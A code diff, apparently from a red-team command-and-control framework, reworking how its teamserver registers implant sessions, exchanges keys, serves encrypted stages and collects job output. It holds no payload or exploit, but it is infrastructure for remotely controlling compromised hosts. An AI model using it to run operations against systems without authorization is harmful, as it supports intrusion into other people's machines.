@@ -1,9 +1,13 @@
-import core.events as events
+import os
 import logging
 import asyncio
-from core.utils import gen_random_string
-from core.teamserver.session import Session
+import uuid
+import core.events as events
+from core.utils import gen_random_string, CmdError
 from core.teamserver import ipc_server
+from core.teamserver.db import STDatabase
+from core.teamserver.crypto import gen_stager_psk
+from core.teamserver.session import Session
 #from core.teamserver.utils import subscribe, register_subscriptions
 
 """
@@ -30,49 +34,66 @@ class Sessions:
         ipc_server.attach(events.KEX, self.kex)
         ipc_server.attach(events.ENCRYPT_STAGE, self.gen_encrypted_stage)
         ipc_server.attach(events.SESSION_STAGED, self.notify_session_staged)
+        #ipc_server.attach(events.SESSION_REGISTER, self._register)
         ipc_server.attach(events.SESSION_CHECKIN, self.session_checked_in)
         ipc_server.attach(events.NEW_JOB, self.add_job)
         ipc_server.attach(events.JOB_RESULT, self.job_result)
 
-    #@subscribe(events.KEX)
-    def kex(self, kex_tuple):
-        guid, remote_addr, pubkey_xml = kex_tuple
+        with STDatabase() as db:
+            for registered_session in db.get_sessions():
+                _, guid, psk = registered_session
+                self._register(guid, psk)
+
+    def get_session(self, guid):
+        return list(filter(lambda x: x == guid, self.sessions))[0]
+
+    def _register(self, guid, psk):
+        session = Session(guid, psk)
+        logging.info(f"Registering session: {session}")
+        self.sessions.add(session)
+
+    def register(self, guid, psk):
+        if not guid:
+            guid = uuid.uuid4()
+        if not psk:
+            psk = gen_stager_psk()
 
         try:
-            session = self.get(guid)
-            logging.debug(f"Creating new pub/priv keys for {guid}")
-            session.jobs.set_peer_public_key(pubkey_xml)
-        except IndexError:
-            logging.debug(f"New kex from {remote_addr} ({guid})")
-            session = Session(guid, remote_addr, pubkey_xml)
-            self.sessions.add(session)
+            uuid.UUID(str(guid))
+        except ValueError:
+            raise CmdError("Invalid Guid")
 
-        return session.jobs.public_key
+        with STDatabase() as db:
+            db.add_session(guid, psk)
+        self._register(guid, psk)
+
+        return {"guid": str(guid), "psk": psk}
+
+    #@subscribe(events.KEX)
+    def kex(self, kex_tuple):
+        guid, remote_addr, enc_pubkey = kex_tuple
+
+        try:
+            session = self.get_session(guid)
+            logging.debug(f"Creating new shared secret with {guid}")
+            session.crypto.derive_shared_key(enc_pubkey)
+            return session.crypto.enc_public_key
+        except IndexError:
+            logging.error(f"Got kex request from {remote_addr} but no sessions registered for guid {guid}")
 
     #@subscribe(events.ENCRYPT_STAGE)
     def gen_encrypted_stage(self, info_tuple):
         guid, _, comms = info_tuple
-        session = self.get(guid)
-        return session.jobs.get_encrypted_stage(comms)
-
-    #@subscribe(events.SESSION_STAGED)
-    def notify_session_staged(self, msg):
-        #Since these methods get called from a seperate OS thread in ipc_server, we must use asyncio.run_coroutine_threadsafe()
-        asyncio.run_coroutine_threadsafe(
-                self.teamserver.users.broadcast_event(
-                    events.SESSION_STAGED, 
-                    msg
-            ),
-            loop=self.teamserver.loop
-        )
+        session = self.get_session(guid)
+        return session.gen_encrypted_stage(comms.split(','))
 
     #@subscribe(events.SESSION_CHECKIN)
     def session_checked_in(self, checkin_tuple):
-        guid, _ = checkin_tuple
+        guid, remote_addr = checkin_tuple
 
-        session = self.get(guid)
+        session = self.get_session(guid)
+        session.address = remote_addr
         session.checked_in()
-
         return session.jobs.get()
 
     #@subscribe(events.NEW_JOB)
@@ -83,7 +104,7 @@ class Sessions:
                 session.jobs.add(job)
         else:
             try:
-                session = self.get(guid)
+                session = self.get_session(guid)
                 session.jobs.add(job)
             except IndexError:
                 logging.error(f"No session was found with name: {guid}")
@@ -91,11 +112,12 @@ class Sessions:
     #@subscribe(events.JOB_RESULT)
     def job_result(self, result_tuple):
         guid, job_id, data = result_tuple
-        session = self.get(guid)
-        decrypted_job_results = session.jobs.results(job_id, data)
+        session = self.get_session(guid)
 
-        if not session.info and decrypted_job_results['cmd'] == 'CheckIn':
-            session.info = decrypted_job_results['result']
+        decrypted_job, job_output = session.jobs.decrypt(job_id, data)
+
+        if not session.info and decrypted_job['cmd'] == 'CheckIn':
+            session.info = job_output
             logging.debug(f"New session {session.guid} connected! ({session.address})")
 
             #Since these methods get called from a seperate OS thread in ipc_server, we must use asyncio.run_coroutine_threadsafe()
@@ -117,23 +139,32 @@ class Sessions:
             asyncio.run_coroutine_threadsafe(
                     self.teamserver.users.broadcast_event(
                         events.JOB_RESULT, 
-                        {'id': job_id, 'output': decrypted_job_results['result'], 'session': session.guid, 'address': session.address}
+                        {'id': job_id, 'output': job_output, 'session': session.guid, 'address': session.address}
                 ),
                 loop=self.teamserver.loop
             )
 
-    def get(self, guid):
-        return list(filter(lambda x: x == guid, self.sessions))[0]
+    #@subscribe(events.SESSION_STAGED)
+    def notify_session_staged(self, msg):
+        #Since these methods get called from a seperate OS thread in ipc_server, we must use asyncio.run_coroutine_threadsafe()
+        asyncio.run_coroutine_threadsafe(
+                self.teamserver.users.broadcast_event(
+                    events.SESSION_STAGED, 
+                    msg
+            ),
+            loop=self.teamserver.loop
+        )
 
     def list(self):
         return {s.guid: dict(s) for s in self.sessions if s.info}
     
     def info(self, guid):
-        return dict(self.get(guid))
+        return dict(self.get_session(guid))
 
     def __iter__(self):
         for session in self.sessions:
-            yield (str(session._guid), dict(session))
+            if session.info:
+                yield (str(session._guid), dict(session))
 
     def __str__(self):
         return self.__class__.__name__.lower()
